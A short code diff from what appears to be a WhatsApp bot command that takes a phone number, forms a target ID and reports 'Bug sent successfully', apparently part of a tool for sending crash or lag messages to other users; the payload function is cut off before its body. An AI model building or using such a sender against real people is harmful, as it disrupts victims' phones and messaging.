@@ -18,7 +18,7 @@ cmd({
             return reply(`\`Example:\` : ${prefix + command} 628×××`);
         }
         let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-        reply(`✔️ Bug sent successfully to{target}. *Please wait for at least 5 minutes before trying again.*`);
+        reply(`✔️ Bug sent successfully.`);
         
 async function ngeloc(target, quoted) {
     try {
